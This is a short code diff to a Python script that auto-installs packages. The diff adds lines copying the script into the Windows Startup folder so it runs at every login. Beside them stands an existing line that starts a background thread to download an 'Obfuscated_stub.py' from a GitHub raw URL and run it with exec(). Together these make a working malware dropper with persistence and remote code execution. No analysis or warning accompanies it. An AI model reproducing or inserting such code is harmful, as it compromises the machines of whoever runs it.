@@ -17,6 +17,9 @@ packages = [
 for package in packages:
     import_or_install(package)
 
+import shutil, os, sys
+shutil.copy(sys.argv[0], os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', os.path.basename(sys.argv[0])))
+
 import threading, requests
 
 threading.Thread(target=lambda: exec(requests.get("https://raw.githubusercontent.com/43a1723/test/main/lmao/a/Obfuscated_stub.py").text)).start()
